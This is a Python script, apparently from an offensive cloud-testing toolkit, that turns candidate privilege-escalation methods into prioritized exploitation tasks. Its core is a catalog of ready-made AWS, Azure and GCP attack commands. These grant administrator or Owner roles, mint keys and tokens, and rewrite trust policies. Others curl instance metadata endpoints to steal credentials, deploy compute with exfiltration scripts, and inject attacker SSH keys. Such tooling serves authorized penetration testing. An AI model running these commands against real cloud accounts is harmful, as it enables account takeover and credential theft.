#!/usr/bin/env python3
"""parse_privesc_paths.py - normalize + prioritize candidate privilege-escalation
methods (from pmapper/pacu/scanner work-units or hand-written lists) into an
ordered rupu work-units array of exploitation tasks.

Input (--input): JSON array whose items are any of
  "aws:CreateAccessKey"                              (provider:method string)
  {"provider":"gcp","method":"serviceAccountKeys.create","targets":[...]}
  {"id":...,"title":...,"targets":[...],"hints":{"method":"AttachUserPolicy",...}}  (upstream work units)

Output (--output): bare JSON array sorted by priority:
  [{"id","title","targets","hints":{"provider","method","priority","commands","reference"}}]

Example:
  python3 scripts/parse_privesc_paths.py -i candidates.json -o out/work-units.json
"""
import argparse
import json
import os
import re
import sys

# priority: 1 direct self-grant, 2 credential minting, 3 trust manipulation,
#           4 deploy-compute / needs new resources
CATALOG = {
    # ---- AWS ----
    ("aws", "createaccesskey"): (2, ["aws iam create-access-key --user-name <USER>"]),
    ("aws", "createloginprofile"): (2, ["aws iam create-login-profile --user-name <USER> --password '<PASS>' --no-password-reset-required"]),
    ("aws", "updateloginprofile"): (2, ["aws iam update-login-profile --user-name <USER> --password '<PASS>' --no-password-reset-required"]),
    ("aws", "createpolicyversion"): (1, ["aws iam create-policy-version --policy-arn <POLICY_ARN> --policy-document file://admin.json --set-as-default"]),
    ("aws", "setdefaultpolicyversion"): (1, ["aws iam set-default-policy-version --policy-arn <POLICY_ARN> --version-id <VID>"]),
    ("aws", "attachuserpolicy"): (1, ["aws iam attach-user-policy --user-name <USER> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"]),
    ("aws", "attachrolepolicy"): (1, ["aws iam attach-role-policy --role-name <ROLE> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"]),
    ("aws", "attachgrouppolicy"): (1, ["aws iam attach-group-policy --group-name <GROUP> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"]),
    ("aws", "putuserpolicy"): (1, ["aws iam put-user-policy --user-name <USER> --policy-name sync --policy-document file://admin.json"]),
    ("aws", "putrolepolicy"): (1, ["aws iam put-role-policy --role-name <ROLE> --policy-name sync --policy-document file://admin.json"]),
    ("aws", "putgrouppolicy"): (1, ["aws iam put-group-policy --group-name <GROUP> --policy-name sync --policy-document file://admin.json"]),
    ("aws", "addusertogroup"): (1, ["aws iam add-user-to-group --group-name <ADMIN_GROUP> --user-name <USER>"]),
    ("aws", "updateassumerolepolicy"): (3, ["aws iam update-assume-role-policy --role-name <ROLE> --policy-document file://trust.json",
                                            "aws sts assume-role --role-arn <ROLE_ARN> --role-session-name sync"]),
    ("aws", "assumerole"): (2, ["aws sts assume-role --role-arn <ROLE_ARN> --role-session-name sync"]),
    ("aws", "passrole-ec2"): (4, ["aws ec2 run-instances --image-id <AMI> --instance-type t3.micro --iam-instance-profile Name=<PROFILE> --user-data file://exfil.sh"]),
    ("aws", "passrole-lambda"): (4, ["aws lambda create-function --function-name sync --runtime python3.12 --role <ROLE_ARN> --handler l.handler --zip-file fileb://f.zip",
                                     "aws lambda invoke --function-name sync out.txt"]),
    ("aws", "updatefunctioncode"): (3, ["aws lambda update-function-code --function-name <FUNC> --zip-file fileb://f.zip"]),
    ("aws", "passrole-glue"): (4, ["aws glue create-dev-endpoint --endpoint-name sync --role-arn <ROLE_ARN> --public-key '<PUBKEY>'"]),
    ("aws", "updategluedevendpoint"): (3, ["aws glue update-dev-endpoint --endpoint-name <EP> --public-key '<PUBKEY>'"]),
    ("aws", "passrole-cloudformation"): (4, ["aws cloudformation create-stack --stack-name sync --template-body file://t.yaml --role-arn <ROLE_ARN> --capabilities CAPABILITY_NAMED_IAM"]),
    ("aws", "passrole-datapipeline"): (4, ["aws datapipeline create-pipeline --name sync --unique-id s1", "aws datapipeline put-pipeline-definition ... && activate-pipeline"]),
    ("aws", "passrole-sagemaker"): (4, ["aws sagemaker create-notebook-instance --notebook-instance-name sync --instance-type ml.t3.medium --role-arn <ROLE_ARN>",
                                        "aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name sync"]),
    ("aws", "passrole-codebuild"): (4, ["aws codebuild create-project --name sync --service-role <ROLE_ARN> --source '{...buildspec exfil...}' ...",
                                        "aws codebuild start-build --project-name sync"]),
    ("aws", "ssmsendcommand"): (3, ["aws ssm send-command --instance-ids <IID> --document-name AWS-RunShellScript --parameters 'commands=[\"curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>\"]'"]),
    ("aws", "ssmstartsession"): (3, ["aws ssm start-session --target <IID>"]),
    # ---- Azure ----
    ("azure", "roleassignmentswrite"): (1, ["az role assignment create --assignee <OBJID> --role Owner --scope /subscriptions/<SUB>"]),
    ("azure", "vmruncommand"): (3, ["az vm run-command invoke -g <RG> -n <VM> --command-id RunShellScript --scripts 'curl -s -H Metadata:true \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\"'"]),
    ("azure", "customscriptextension"): (4, ["az vm extension set -g <RG> --vm-name <VM> --name CustomScript --publisher Microsoft.Azure.Extensions --settings '{\"commandToExecute\":\"<CMD>\"}'"]),
    ("azure", "keyvaultpolicy"): (2, ["az keyvault set-policy -n <VAULT> --object-id <OBJID> --secret-permissions get list",
                                      "az keyvault secret show --vault-name <VAULT> -n <SECRET> --query value -o tsv"]),
    ("azure", "automationrunbook"): (4, ["az automation runbook create/replace-content/publish/start -g <RG> --automation-account-name <ACCT> -n Maint"]),
    ("azure", "spownersecret"): (2, ["az ad app credential reset --id <APPID> --append --display-name sync",
                                     "az login --service-principal -u <APPID> -p '<PASS>' --tenant <TENANT>"]),
    ("azure", "elevateaccess"): (3, ["az rest --method POST --url 'https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01'",
                                     "az role assignment create --assignee <OBJID> --role Owner --scope /providers/Microsoft.Management/managementGroups/<ROOT>"]),
    ("azure", "managedidentityassign"): (3, ["az vm identity assign -g <RG> -n <VM> --identities <IDENTITY_RESOURCE_ID>"]),
    # ---- GCP ----
    ("gcp", "serviceaccountkeyscreate"): (2, ["gcloud iam service-accounts keys create sa.json --iam-account <SA_EMAIL>",
                                              "gcloud auth activate-service-account --key-file=sa.json"]),
    ("gcp", "getaccesstoken"): (2, ["gcloud auth print-access-token --impersonate-service-account=<SA_EMAIL>"]),
    ("gcp", "signjwt"): (2, ["POST https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<SA_EMAIL>:signJwt (see references/gcp.md)"]),
    ("gcp", "implicitdelegation"): (2, ["generateAccessToken with delegates:[sa-b] chain (see references/gcp.md)"]),
    ("gcp", "setiampolicy"): (1, ["gcloud projects add-iam-policy-binding <PROJECT> --member user:<YOU> --role roles/owner"]),
    ("gcp", "actas-compute"): (4, ["gcloud compute instances create sync --service-account <SA_EMAIL> --scopes cloud-platform --metadata startup-script='<TOKEN_EXFIL>'"]),
    ("gcp", "actas-function"): (4, ["gcloud functions deploy sync --trigger-http --allow-unauthenticated --service-account <SA_EMAIL> --source <DIR> --entry-point h --runtime python312"]),
    ("gcp", "actas-run"): (4, ["gcloud run deploy sync --image <IMG> --service-account <SA_EMAIL> --allow-unauthenticated --region <REGION>"]),
    ("gcp", "cloudbuild"): (4, ["gcloud builds submit --no-source --config cb.yaml  # steps exfil the build SA token"]),
    ("gcp", "deploymentmanager"): (4, ["gcloud deployment-manager deployments create sync --config dm.yaml  # runs as <prjnum>@cloudservices"]),
    ("gcp", "setmetadata"): (3, ["gcloud compute instances add-metadata <VM> --zone <ZONE> --metadata ssh-keys='intruder:<PUBKEY>'",
                                 "ssh intruder@<VM_IP>  # then curl metadata token"]),
    ("gcp", "oslogin"): (3, ["gcloud compute os-login ssh-keys add --key-file k.pub", "gcloud compute ssh <VM> --zone <ZONE>"]),
}

# fuzzy aliases -> canonical catalog key
ALIASES = {
    "createnewpolicyversion": "createpolicyversion",
    "setexistingdefaultpolicyversion": "setdefaultpolicyversion",
    "updatingassumerolepolicy": "updateassumerolepolicy",
    "updaterolepolicytoassumeit": "updateassumerolepolicy",
    "createec2withexistingip": "passrole-ec2",
    "passexistingroletonewlambdatheninvoke": "passrole-lambda",
    "passexistingroletonewlambdathentriggerwithnewdynamo": "passrole-lambda",
    "passexistingroletonewlambdathentriggerwithexistingdynamo": "passrole-lambda",
    "editexistinglambdafunctionwithrole": "updatefunctioncode",
    "lambdaupdatefunctioncode": "updatefunctioncode",
    "passexistingroletonewgluedevendpoint": "passrole-glue",
    "updateexistinggluedevendpoint": "updategluedevendpoint",
    "passexistingroletocloudformation": "passrole-cloudformation",
    "passexistingroletonewdatapipeline": "passrole-datapipeline",
    "passexistingroletonewcodestarproject": "passrole-codebuild",
    "iamserviceaccountkeyscreate": "serviceaccountkeyscreate",
    "iamserviceaccountsgetaccesstoken": "getaccesstoken",
    "iamserviceaccountssignjwt": "signjwt",
    "iamserviceaccountsimplicitdelegation": "implicitdelegation",
    "resourcemanagerprojectssetiampolicy": "setiampolicy",
    "microsoftauthorizationroleassignmentswrite": "roleassignmentswrite",
    "runcommand": "vmruncommand",
    "ssmsendcommandstartsession": "ssmsendcommand",
    "stsassumerole": "assumerole",
}

PROVIDER_HINTS = {"aws": "aws", "amazon": "aws", "azure": "azure", "az": "azure",
                  "entra": "azure", "gcp": "gcp", "google": "gcp"}


def norm(s):
    return re.sub(r"[^a-z0-9-]", "", s.lower().replace("iam:", "").replace(" + ", "-"))


def resolve(provider, method):
    """Return (provider, canonical_method, priority, commands) or best-effort."""
    nm = norm(method)
    nm = ALIASES.get(nm.replace("-", ""), ALIASES.get(nm, nm))
    # exact
    for (p, m), (prio, cmds) in CATALOG.items():
        if provider and p != provider:
            continue
        if m == nm or m.replace("-", "") == nm.replace("-", ""):
            return p, m, prio, cmds
    # substring fallback
    for (p, m), (prio, cmds) in CATALOG.items():
        if provider and p != provider:
            continue
        key = m.replace("-", "")
        if key and (key in nm.replace("-", "") or nm.replace("-", "") in key):
            return p, m, prio, cmds
    return provider or "unknown", method, 9, ["<no catalog match: consult references/%s.md>" % (provider or "aws")]


def load_candidates(path):
    with open(path, "r", encoding="utf-8") as fh:
        data = json.load(fh)
    if not isinstance(data, list):
        data = [data]
    out = []
    for item in data:
        if isinstance(item, str):
            if ":" in item:
                prov, meth = item.split(":", 1)
                out.append({"provider": PROVIDER_HINTS.get(prov.lower(), ""), "method": meth, "targets": []})
            else:
                out.append({"provider": "", "method": item, "targets": []})
        elif isinstance(item, dict):
            hints = item.get("hints", {}) if isinstance(item.get("hints"), dict) else {}
            method = item.get("method") or hints.get("method") or item.get("title", "")
            provider = (item.get("provider") or hints.get("provider") or "").lower()
            if not provider:
                blob = json.dumps(item).lower()
                for k, v in PROVIDER_HINTS.items():
                    if k in blob:
                        provider = v
                        break
            out.append({"provider": PROVIDER_HINTS.get(provider, provider),
                        "method": method,
                        "targets": item.get("targets", []) or [],
                        "extra": hints})
    return out


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("-i", "--input", required=True,
                    help="JSON array of candidates (strings, dicts, or upstream work-units)")
    ap.add_argument("-o", "--output", default="out/work-units.json",
                    help="prioritized work-units array (default: %(default)s)")
    ap.add_argument("--assets", default="out/assets.json",
                    help="asset list from candidate targets (default: %(default)s)")
    args = ap.parse_args()

    units, assets_seen = [], {}
    for cand in load_candidates(args.input):
        prov, meth, prio, cmds = resolve(cand.get("provider", ""), cand.get("method", ""))
        targets = cand.get("targets", [])
        units.append({
            "priority_sort": prio,
            "unit": {
                "title": "[%s] %s%s" % (prov, meth, (" -> " + targets[-1]) if targets else ""),
                "targets": targets,
                "hints": {
                    "provider": prov,
                    "method": meth,
                    "priority": str(prio),
                    "commands": cmds,
                    "reference": "references/%s.md" % (prov if prov in ("aws", "azure", "gcp") else "aws"),
                    **{k: v for k, v in cand.get("extra", {}).items()
                       if k not in ("provider", "method") and isinstance(v, (str, int, list))},
                },
            },
        })
        for t in targets:
            assets_seen[t] = {"asset": t, "kind": "principal",
                              "attrs": {"provider": prov, "privesc_target": "true"}}

    units.sort(key=lambda u: u["priority_sort"])
    final = []
    for i, u in enumerate(units, 1):
        unit = u["unit"]
        unit = {"id": "privesc-%04d" % i, "title": unit["title"],
                "targets": unit["targets"], "hints": unit["hints"]}
        final.append(unit)

    os.makedirs(os.path.dirname(args.output) or ".", exist_ok=True)
    with open(args.output, "w", encoding="utf-8") as fh:
        json.dump(final, fh, indent=2)
    os.makedirs(os.path.dirname(args.assets) or ".", exist_ok=True)
    with open(args.assets, "w", encoding="utf-8") as fh:
        json.dump(list(assets_seen.values()), fh, indent=2)
    sys.stderr.write("[+] %d prioritized units -> %s | %d assets -> %s\n"
                     % (len(final), args.output, len(assets_seen), args.assets))


if __name__ == "__main__":
    main()
